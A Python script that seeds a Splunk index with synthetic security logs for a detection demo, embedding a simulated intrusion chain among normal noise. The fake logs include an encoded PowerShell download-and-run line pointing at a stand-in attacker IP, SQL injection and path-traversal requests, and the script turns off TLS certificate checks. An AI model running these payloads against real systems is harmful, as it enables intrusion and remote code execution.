r"""Seed a self-contained, reproducible SOC dataset into Splunk (index=soc_demo).

Why this exists: a Grand-Prize demo needs *security* data, and judges should be
able to reproduce it in minutes — no 5 GB BOTS download. So we generate a small,
realistic blend of normal activity + an embedded multi-stage intrusion and ingest
it over localhost (Splunk REST `receivers/simple`, no extra ports/tokens).

IMPORTANT (no answer keys): the specific IPs/users below are *demo data only*.
The detection logic (agent SPL + validator) is behavioural and never references
these values — it finds the attack by pattern (failed-login burst, periodic
beacon, large egress), exactly as it would on a held-out box.

Embedded ATT&CK chain (for the writer's reference, NOT given to the agent) — spans
6 sourcetypes (auth, web, firewall, Windows Security/System, Sysmon, AWS CloudTrail),
the "many connectors" story, with cross-source corroboration:
   Initial Access  T1110        : 203.0.113.66 brute-forces svc_backup (linux_secure + windows:security 4625), then succeeds
   Execution       T1059.001    : winword.exe spawns powershell.exe -enc <b64> (Sysmon)
   Persistence     T1543.003    : 7045 kernel-mode-driver service from C:\Windows\Temp (windows:system)
   Priv Esc        T1078        : 4672 SeDebugPrivilege granted to svc_backup (windows:security)
   Defense Evasion T1070.001    : 1102 audit log cleared (windows:security)
   Lateral Move    T1021        : svc_backup into many hosts (linux_secure + windows:security 4624 type 3)
   C2              T1071        : 10.10.0.42 -> 198.51.100.23:443 on a fixed ~60s beacon (cisco:asa)
   Exfil           T1567/T1530  : ~900 MB egress + public S3 bucket + bulk GetObject (cisco:asa + aws:cloudtrail)

stdlib only; reads .env; idempotent (skips if soc_demo already has events)."""
from __future__ import annotations

import base64
import json
import os
import random
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from config import load_env  # noqa: E402

INDEX = "soc_demo"
random.seed(1337)  # reproducible

cfg = load_env()
HOST = cfg["SPLUNK_HOST"].rstrip("/")
BASIC = "Basic " + base64.b64encode(
    f"{cfg['SPLUNK_USER']}:{cfg['SPLUNK_PASSWORD']}".encode()).decode()
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def _send(method, path, *, data=None, params=None, ctype=None):
    url = HOST + path + ("?" + urllib.parse.urlencode(params) if params else "")
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Authorization", BASIC)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=60) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def iso(ts: float) -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(ts)) + "Z"


def ensure_index() -> None:
    st, _ = _send("POST", "/services/data/indexes",
                  data=urllib.parse.urlencode({"name": INDEX}).encode(),
                  params={"output_mode": "json"},
                  ctype="application/x-www-form-urlencoded")
    print(f"  ensure index {INDEX}: HTTP {st} ({'created' if st in (200,201) else 'exists/again'})")


def count_events() -> int:
    body = urllib.parse.urlencode({
        "search": f"search index={INDEX} | stats count", "output_mode": "json",
        "exec_mode": "oneshot",
    }).encode()
    st, resp = _send("POST", "/services/search/jobs", data=body,
                     ctype="application/x-www-form-urlencoded")
    if st != 200:
        return 0
    rows = json.loads(resp).get("results", [])
    return int(rows[0].get("count", 0)) if rows else 0


def send_event(ts: float, sourcetype: str, source: str, host: str, kv: str) -> int:
    raw = f"{iso(ts)} {kv}"
    st, _ = _send("POST", "/services/receivers/simple", data=raw.encode(),
                  params={"index": INDEX, "sourcetype": sourcetype,
                          "source": source, "host": host},
                  ctype="text/plain")
    return st


# --------------------------------------------------------------------------
# Event generation
# --------------------------------------------------------------------------
def build_events(now: float) -> list[tuple]:
    """Return (ts, sourcetype, source, host, kv_line) tuples. ~24h window."""
    ev = []
    DAY = 86400
    users = ["alice", "bob", "carol", "dave", "eve"]
    hosts = ["web01", "web02", "db01", "app01", "vpn01", "fs01", "dc01"]
    SECURE = ("linux_secure", "/var/log/secure")
    WEB = ("access_combined", "/var/log/httpd/access_log")
    FW = ("cisco:asa", "udp:514")

    # 1) Normal auth noise across the day (legit logins)
    for _ in range(140):
        ts = now - random.uniform(0, DAY)
        u = random.choice(users)
        h = random.choice(hosts)
        sip = f"10.10.{random.randint(0,3)}.{random.randint(2,250)}"
        ev.append((ts, SECURE[0], SECURE[1], h,
                   f'app=sshd action=success user={u} src_ip={sip} dest_host={h} '
                   f'reason="Accepted password for {u}"'))

    # 2) Brute force: external IP, many failures vs svc_backup on vpn01, then success
    bf_start = now - 3 * 3600
    attacker = "203.0.113.66"
    for i in range(45):
        ts = bf_start + i * random.uniform(6, 11)
        ev.append((ts, SECURE[0], SECURE[1], "vpn01",
                   f'app=sshd action=failure user=svc_backup src_ip={attacker} '
                   f'dest_host=vpn01 reason="Failed password for svc_backup"'))
    breach = bf_start + 45 * 10
    ev.append((breach, SECURE[0], SECURE[1], "vpn01",
               f'app=sshd action=success user=svc_backup src_ip={attacker} '
               f'dest_host=vpn01 reason="Accepted password for svc_backup"'))

    # 3) Lateral movement: svc_backup hops across many internal hosts post-breach
    for j, h in enumerate(["db01", "app01", "fs01", "dc01"]):
        ts = breach + 120 + j * random.uniform(40, 90)
        ev.append((ts, SECURE[0], SECURE[1], h,
                   f'app=sshd action=success user=svc_backup src_ip=10.10.0.42 '
                   f'dest_host={h} reason="Accepted password for svc_backup"'))

    # 4) Web attack from the same external IP (SQLi + traversal), 401/403 then 200
    web_start = bf_start - 600
    web_hits = [
        ('GET /admin?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1', 403),
        ('GET /admin?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1', 403),
        ('GET /../../../../etc/passwd HTTP/1.1', 404),
        ('GET /admin/config.php HTTP/1.1', 401),
        ('POST /login HTTP/1.1', 401),
        ('POST /login HTTP/1.1', 200),
        ('GET /admin/users?export=all HTTP/1.1', 200),
    ]
    for k, (req, status) in enumerate(web_hits):
        ts = web_start + k * random.uniform(5, 20)
        ev.append((ts, WEB[0], WEB[1], "web01",
                   f'src_ip={attacker} method={req.split()[0]} '
                   f'uri="{req.split()[1]}" status={status} '
                   f'user_agent="sqlmap/1.7" bytes={random.randint(200,9000)}'))

    # web normal noise
    for _ in range(60):
        ts = now - random.uniform(0, DAY)
        sip = f"10.10.{random.randint(0,3)}.{random.randint(2,250)}"
        uri = random.choice(["/", "/index.html", "/api/health", "/products", "/cart"])
        ev.append((ts, WEB[0], WEB[1], random.choice(["web01", "web02"]),
                   f'src_ip={sip} method=GET uri="{uri}" status=200 '
                   f'user_agent="Mozilla/5.0" bytes={random.randint(300,15000)}'))

    # 5) C2 beacon: 10.10.0.42 -> 198.51.100.23:443 every ~60s (regular interval)
    c2 = "198.51.100.23"
    beacon_start = breach + 600
    for i in range(40):
        ts = beacon_start + i * (60 + random.uniform(-2, 2))  # tight ~60s cadence
        ev.append((ts, FW[0], FW[1], "fw01",
                   f'action=allowed src_ip=10.10.0.42 dest_ip={c2} dest_port=443 '
                   f'protocol=tcp bytes_out={random.randint(800,1400)} '
                   f'bytes_in={random.randint(400,900)}'))

    # 6) Exfil: one large outbound burst to the same C2 host
    ev.append((beacon_start + 40 * 60, FW[0], FW[1], "fw01",
               f'action=allowed src_ip=10.10.0.42 dest_ip={c2} dest_port=443 '
               f'protocol=tcp bytes_out=912340000 bytes_in=4200'))

    # firewall normal noise
    for _ in range(60):
        ts = now - random.uniform(0, DAY)
        sip = f"10.10.{random.randint(0,3)}.{random.randint(2,250)}"
        dip = f"{random.choice([93,142,172,8])}.{random.randint(1,254)}." \
              f"{random.randint(1,254)}.{random.randint(1,254)}"
        ev.append((ts, FW[0], FW[1], "fw01",
                   f'action=allowed src_ip={sip} dest_ip={dip} '
                   f'dest_port={random.choice([80,443,53])} protocol=tcp '
                   f'bytes_out={random.randint(500,50000)} bytes_in={random.randint(500,90000)}'))

    # ===== Endpoint + cloud telemetry (what the WinEventLog/Sysmon/AWS connectors ship) =====
    # Custom sourcetypes + non-"WinEventLog" sources so Splunk's built-in
    # source::WinEventLog props (which suppress key=value auto-extraction) don't fire.
    WINSEC = ("windows:security", "windows_security.log")
    WINSYS = ("windows:system", "windows_system.log")
    SYSMON = ("XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "Sysmon")
    CLOUD = ("aws:cloudtrail", "cloudtrail")

    # 7) Windows 4625 failed logons corroborate the brute force (2nd source for T1110)
    for i in range(20):
        ts = bf_start + i * random.uniform(10, 18)
        ev.append((ts, WINSEC[0], WINSEC[1], "WIN-VPN01",
                   f'EventCode=4625 status=0xC000006A user=svc_backup src_ip={attacker} '
                   f'LogonType=3 message="An account failed to log on"'))
    # 4672 special privileges assigned to the compromised account (T1078 / priv-esc)
    ev.append((breach + 30, WINSEC[0], WINSEC[1], "WIN-VPN01",
               'EventCode=4672 user=svc_backup privileges="SeDebugPrivilege,SeTcbPrivilege" '
               'message="Special privileges assigned to new logon"'))
    # 4624 type-3 lateral logons across Windows hosts (T1021, corroborates linux_secure)
    for j, h in enumerate(["WIN-DB01", "WIN-APP01", "WIN-DC01"]):
        ev.append((breach + 200 + j * 60, WINSEC[0], WINSEC[1], h,
                   f'EventCode=4624 LogonType=3 user=svc_backup src_ip=10.10.0.42 '
                   f'dest_host={h} message="An account was successfully logged on"'))

    # 8) Persistence — 7045 service install from a temp path (T1543.003; the Ensemble
    #    rootkit-driver signal: kernel-mode driver service from C:\Windows\Temp)
    ev.append((breach + 400, WINSYS[0], WINSYS[1], "WIN-DC01",
               'EventCode=7045 service_name=WinDefendUpd '
               'image_path="C:\\Windows\\Temp\\svc_update.exe" '
               'service_type="kernel mode driver" start_type="auto start" '
               'message="A new service was installed in the system"'))

    # 9) Execution — Sysmon process-create: winword -> powershell -enc (T1059.001, bad ancestry)
    import base64 as _b64
    _enc = _b64.b64encode(
        "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a')"
        .encode("utf-16-le")).decode()
    ev.append((breach + 120, SYSMON[0], SYSMON[1], "WIN-APP01",
               'EventCode=1 ParentImage="C:\\Program Files\\Microsoft Office\\winword.exe" '
               'Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
               f'CommandLine="powershell.exe -nop -w hidden -enc {_enc}" User=svc_backup'))
    ev.append((breach + 150, SYSMON[0], SYSMON[1], "WIN-APP01",
               'EventCode=3 Image="powershell.exe" DestinationIp=198.51.100.23 '
               'DestinationPort=443 User=svc_backup'))

    # 10) Defense Evasion — Windows security audit log cleared (T1070.001)
    ev.append((breach + 3600, WINSEC[0], WINSEC[1], "WIN-DC01",
               'EventCode=1102 user=svc_backup message="The audit log was cleared"'))

    # 11) Cloud (CloudTrail) — failed console logins from the attacker IP, then a bucket
    #     made public + bulk GetObject (T1078.004 + T1530 cloud exfil)
    for i in range(8):
        ts = bf_start - 1800 + i * random.uniform(20, 60)
        ev.append((ts, CLOUD[0], CLOUD[1], "aws",
                   'eventName=ConsoleLogin errorMessage="Failed authentication" '
                   f'userIdentity_userName=svc-deploy sourceIPAddress={attacker} '
                   'awsRegion=us-east-1 additionalEventData_MFAUsed=No'))
    ev.append((breach + 1800, CLOUD[0], CLOUD[1], "aws",
               'eventName=PutBucketAcl userIdentity_userName=svc-deploy '
               'sourceIPAddress=10.10.0.42 requestParameters_bucketName=corp-backups-prod '
               'requestParameters_x_amz_acl=public-read awsRegion=us-east-1'))
    ev.append((breach + 1900, CLOUD[0], CLOUD[1], "aws",
               'eventName=GetObject userIdentity_userName=svc-deploy '
               'sourceIPAddress=10.10.0.42 requestParameters_bucketName=corp-backups-prod '
               'bytes_out=734003200 awsRegion=us-east-1'))

    ev.sort(key=lambda e: e[0])
    return ev


def reset_index() -> None:
    """Delete the demo index + its data, then recreate (clean reproducible state)."""
    st, _ = _send("DELETE", f"/services/data/indexes/{INDEX}", params={"output_mode": "json"})
    print(f"  reset: DELETE index {INDEX} -> HTTP {st}")
    time.sleep(2)


def main() -> None:
    force = "--force" in sys.argv
    reset = "--reset" in sys.argv
    print(f"Seeding index={INDEX} on {HOST}")
    if reset:
        reset_index()
    ensure_index()
    existing = count_events()
    if existing and not (force or reset):
        print(f"  index already has {existing} events — skipping (use --reset to rebuild, --force to add).")
        return

    now = time.time()
    events = build_events(now)
    print(f"  generating {len(events)} events over the last 24h…")
    ok = 0
    for ts, st_type, src, host, kv in events:
        if send_event(ts, st_type, src, host, kv) in (200, 201):
            ok += 1
    print(f"  ingested {ok}/{len(events)} events.")
    time.sleep(3)  # let the indexer catch up
    print(f"  index now holds {count_events()} events.")
    print("\n✅ Done. The agent is given only a generic SOC question; it must discover "
          "the intrusion by behaviour.")


if __name__ == "__main__":
    main()
